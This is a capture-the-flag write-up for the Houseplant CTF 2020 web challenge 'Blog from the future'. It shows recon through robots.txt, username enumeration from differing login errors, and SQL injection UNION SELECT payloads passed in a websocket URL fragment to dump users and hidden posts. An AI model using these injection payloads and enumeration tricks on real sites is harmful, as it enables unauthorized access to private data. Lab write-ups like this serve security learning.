<h1>Houseplant CTF 2020 â€“ Blog from the future</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 1922</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>My friend Bob likes sockets so much, he made his own blog to talk about them. Can you check it out and make sure that it's secure like he assured me it is?</p>
  
  <p>http://challs.houseplant.riceteacatpanda.wtf:30003</p>
  
  <p>Dev: jammy</p>
</blockquote>

<h2>Solution</h2>

<p>A post in the home page says the following.</p>

<p><code>
I finally upgraded my blog to use the tech of the future! I'm now using state of the art protection to defend from those pesky spammers... however, I still have to replace my database software to be truly able to call my blog "futuristic". :/
</code></p>

<p>Doing some recon, the following file can be found: <code>http://challs.houseplant.riceteacatpanda.wtf:30003/robots.txt</code>.</p>

<p><code>
User-Agent: *
Disallow: /admin
</code></p>

<p>So you can discover an administration page at <code>http://challs.houseplant.riceteacatpanda.wtf:30003/admin</code>.</p>

<p>```html
<!DOCTYPE html>
<html>
  <head>
    <title>Bob&#39;s Socket Reviews Administrative Panel</title>
    <link rel='stylesheet' href='/stylesheets/style.css' />
    <link rel='stylesheet' href='/stylesheets/admin.css' />
  </head>
  <body>
    <a href="#home"><h1>Bob&#39;s Socket Reviews Administrative Panel</h1></a>
    <hr /></p>

<pre><code>&lt;form method="POST"&gt;
    &lt;input type="text" name="username" placeholder="Username" /&gt;
    &lt;input type="password" name="password" placeholder="Password" /&gt;
    &lt;!-- I've replaced the password with a one-time TOTP token, but the evil hackers don't need to know that... &gt;:)
    &lt;input type="password" name="totp" placeholder="One-time TOTP token" /&gt; --&gt;
    &lt;input type="submit" value="Log in" /&gt;
&lt;/form&gt;
</code></pre>

<p></body>
</html>
```</p>

<p>Despite the interesting HTML comment, even changing the input field from <code>password</code> to <code>totp</code> will show that the authentication form is not vulnerable to SQL injection.</p>

<p>You can only discover that the username is <code>bob</code>, because for nonexistent user, the authentication answers <code>User not found</code>, otherwise it answers <code>Login failed</code>.</p>

<p>Analyzing the websockets traffic, you can discover that posts are retrieved with a packet like the following.</p>

<p><img src="websockets-traffic.png" alt="websockets-traffic.png" /></p>

<p>The second part of the packet is the post ID passed using the value specified like URL fragment (i.e. after <code>#</code>). </p>

<p>Analyzing the code in the client side, you can discover that 6 parameters are read form the server response:
* <code>author</code>;
* <code>hidden</code>, this value seems interesting, because now we know that hidden posts are present;
* <code>id</code>;
* <code>postDate</code>;
* <code>text</code>;
* <code>title</code>.</p>

<p><img src="client-code.png" alt="client-code.png" /></p>

<p>You can try a SQL injection on data passed using fragment values.</p>

<p><code>
http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,null,null,null,null,null
</code></p>

<p>Users can be read with the following.</p>

<p><code>
http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,username,null,null,null,null/**/from/**/users
</code></p>

<p>And the flag can be discovered reading all posts.</p>

<p><code>
http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,null,null,text,null,null/**/from/**/posts
</code></p>

<p><img src="sqli.png" alt="sqli.png" /></p>

<p>The flag is the following.</p>

<p><code>
rtcp{WebSock3t5_4r3_SQLi_vu1n3r4b1e_t00_bacfe0}
</code></p>
